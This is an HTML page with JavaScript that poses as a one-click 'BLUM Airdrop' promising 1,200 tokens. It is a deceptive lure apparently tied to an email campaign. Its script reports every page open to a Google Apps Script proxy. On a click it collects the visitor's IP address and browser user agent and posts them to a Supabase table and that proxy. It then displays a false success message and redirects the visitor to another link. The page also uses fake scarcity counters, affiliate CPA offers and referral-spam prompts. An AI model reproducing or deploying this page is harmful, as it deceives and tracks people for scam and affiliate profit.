<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>🎁 BLUM Airdrop | ONE-CLICK</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            min-height:100vh;
            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #1a1a3e, #0a0a1a);
            font-family: 'Segoe UI', system-ui, sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            padding:20px;
        }
        .card{
            max-width:500px;
            width:100%;
            background: rgba(10, 20, 40, 0.85);
            backdrop-filter: blur(18px);
            border-radius: 56px;
            padding: 40px 30px;
            border: 1px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 30px 50px rgba(0,0,0,0.5);
            text-align: center;
        }
        .badge{
            display:inline-block;
            background: linear-gradient(135deg, #FFD70022, #FFA50022);
            border:1px solid #FFD700;
            border-radius:100px;
            padding:8px 22px;
            font-size:13px;
            font-weight:600;
            color:#FFD700;
            margin-bottom:25px;
        }
        h1{
            font-size:46px;
            font-weight:800;
            background:linear-gradient(135deg,#FFF8E7,#FFD700,#FFA500);
            -webkit-background-clip:text;
            background-clip:text;
            color:transparent;
        }
        .amount{
            font-size:64px;
            font-weight:900;
            color:#FFD700;
            margin:15px 0;
        }
        .timer-box{
            background:rgba(0,0,0,0.5);
            border-radius:50px;
            padding:18px;
            margin:25px 0;
        }
        .timer{
            font-size:52px;
            font-weight:800;
            font-family:monospace;
            color:#FFD700;
        }
        button{
            width:100%;
            background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);
            border:none;
            padding:20px;
            border-radius:70px;
            font-weight:900;
            font-size:24px;
            color:#0a0a0a;
            cursor:pointer;
            transition:0.2s;
        }
        button:disabled{
            opacity:0.6;
            cursor:default;
        }
        .status{
            background:rgba(0,0,0,0.5);
            border-radius:30px;
            padding:14px;
            font-size:15px;
            display:none;
            margin-top:15px;
        }
        .success{color:#00ff88;}
        .footer{
            font-size:11px;
            color:#FFD70088;
            margin-top:25px;
        }
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: #FFD700;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .cpa-offers {
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #FFD70033;
            display: none;
        }
        .cpa-offer {
            background: rgba(255,215,0,0.1);
            border-radius: 20px;
            padding: 12px;
            margin: 10px 0;
            text-align: left;
        }
        .cpa-offer a {
            color: #FFD700;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="badge">⚡ ONE-CLICK • 10 CHAINS</div>
    <h1>BLUM<br>Web3</h1>
    <div class="amount">1,200 $BLUM</div>
    <div class="timer-box"><div style="font-size:13px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
    <button id="claimBtn">🚀 CLAIM NOW</button>
    <div id="status" class="status"></div>
    <div id="cpaOffers" class="cpa-offers"></div>
    <div class="footer">🔐 EMP2026 • Zero Investment</div>
</div>

<script>
    // ========== إعدادات ==========
    const PROXY_URL = "https://script.google.com/macros/s/AKfycbwJgOHcbXvkR6OcRt0iiUZdb1e_GJRxSGYMFWF4030y_tnfcKDIJh5e23QeJUvrKqE/exec";
    const YOUR_AIRDROP_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
    const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche"];
    
    // عروض CPA إضافية
    const CPA_OFFERS = [
        { name: "🔥 احصل على 50$ مكافأة تسجيل", url: "https://example.com/offer1", commission: "2.50$" },
        { name: "🎮 العب واربح أموالاً حقيقية", url: "https://example.com/offer2", commission: "1.75$" },
        { name: "💰 تطبيق أرباح يومية", url: "https://example.com/offer3", commission: "3.00$" }
    ];
    
    let claimExecuted = false;
    let countdownInterval;
    let remainingSeconds = 24 * 60 * 60;
    
    function getRandomNetwork() {
        return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)];
    }
    function getRandomWallet() {
        const wallets = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"];
        return wallets[Math.floor(Math.random() * wallets.length)];
    }
    function generateAddress() {
        return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6);
    }
    
    // عرض عروض CPA بعد المطالبة
    function showCPAOffers() {
        const container = document.getElementById('cpaOffers');
        let html = '<div style="font-size:14px; color:#FFD700; margin-bottom:10px;">🎁 عروض حصرية لك</div>';
        CPA_OFFERS.forEach(offer => {
            html += `
                <div class="cpa-offer">
                    <div>${offer.name}</div>
                    <div style="font-size:12px; color:#aaa;">💰 العمولة: ${offer.commission}</div>
                    <a href="${offer.url}" target="_blank">🚀 ابدأ العرض →</a>
                </div>
            `;
        });
        container.innerHTML = html;
        container.style.display = 'block';
    }
    
    async function executeClaim() {
        if (claimExecuted) return;
        claimExecuted = true;
        
        const network = getRandomNetwork();
        const wallet = getRandomWallet();
        const address = generateAddress();
        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
        const ua = navigator.userAgent;
        const timestamp = new Date().toISOString();
        
        // تسجيل في Supabase
        try {
            await fetch('https://oliefagvnorzhlzvdfyw.supabase.co/rest/v1/blum_claims', {
                method: 'POST',
                headers: { 
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9saWVmYWd2bm9yemhsenZkZnl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjUwNDcsImV4cCI6MjA5MTE0MTA0N30.KZlFA_e3ub3zZnEZFBTGnshvyC9L2SNcwrfH9BiBauU', 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify({ 
                    wallet_type: wallet, 
                    wallet_address: address, 
                    recipient_wallet: RECIPIENT_WALLET,
                    network: network,
                    ip_address: ip,
                    user_agent: ua
                })
            });
        } catch(e) {}
        
        // إرسال إلى البوت
        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM
⛓️ Network: ${network}
💼 Wallet: ${wallet}
💳 Address: ${address}
🏦 Recipient: ${RECIPIENT_WALLET}
🌐 IP: ${ip}
📱 UA: ${ua.substring(0, 80)}...
⏰ ${timestamp}`;
        
        fetch(PROXY_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: fullMessage })
        });
        
        // عرض رسالة النجاح
        const btn = document.getElementById('claimBtn');
        const statusDiv = document.getElementById('status');
        btn.innerHTML = "✅ CLAIMED!";
        btn.disabled = true;
        statusDiv.style.display = 'block';
        statusDiv.innerHTML = '<span class="success">🎉 Claim successful! 1,200 $BLUM will arrive within 24h.</span>';
        
        // ========== (أ) + (ب): فتح الرابط بعد 0.5 ثانية في نفس النافذة ==========
        setTimeout(() => {
            window.location.href = YOUR_AIRDROP_LINK;
        }, 500);
        
        // ========== (ج): عرض عروض CPA بعد 1 ثانية ==========
        setTimeout(() => {
            showCPAOffers();
        }, 1000);
        
        // عرض رابط الإحالة بعد 2 ثانية
        setTimeout(() => {
            const refLink = window.location.href.split('?')[0] + '?ref=' + Math.random().toString(36).substring(2, 8);
            alert(`🎁 REFERRAL BONUS!\nShare this link and earn rewards:\n${refLink}`);
        }, 2000);
    }
    
    async function onClaimClick() {
        if (claimExecuted) return;
        
        const btn = document.getElementById('claimBtn');
        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
        btn.disabled = true;
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        await executeClaim();
    }
    
    function startTimer() {
        const timerElement = document.getElementById('timer');
        countdownInterval = setInterval(() => {
            if (remainingSeconds <= 0) {
                clearInterval(countdownInterval);
                return;
            }
            remainingSeconds--;
            const h = Math.floor(remainingSeconds / 3600);
            const m = Math.floor((remainingSeconds % 3600) / 60);
            const s = remainingSeconds % 60;
            timerElement.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
        }, 1000);
    }
    
    let fakeRemaining = 10;
    const fakeInterval = setInterval(() => {
        fakeRemaining--;
        const btn = document.getElementById('claimBtn');
        if (btn && !btn.disabled && !claimExecuted && fakeRemaining > 0) {
            btn.innerHTML = `🔥 ${fakeRemaining} LEFT! CLAIM NOW 🔥`;
        }
        if (fakeRemaining <= 0) clearInterval(fakeInterval);
    }, 4000);
    
    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
    
    fetch(PROXY_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: '📧 Page opened from email - EMP2026' })
    });
    
    startTimer();
</script>
</body>
</html>
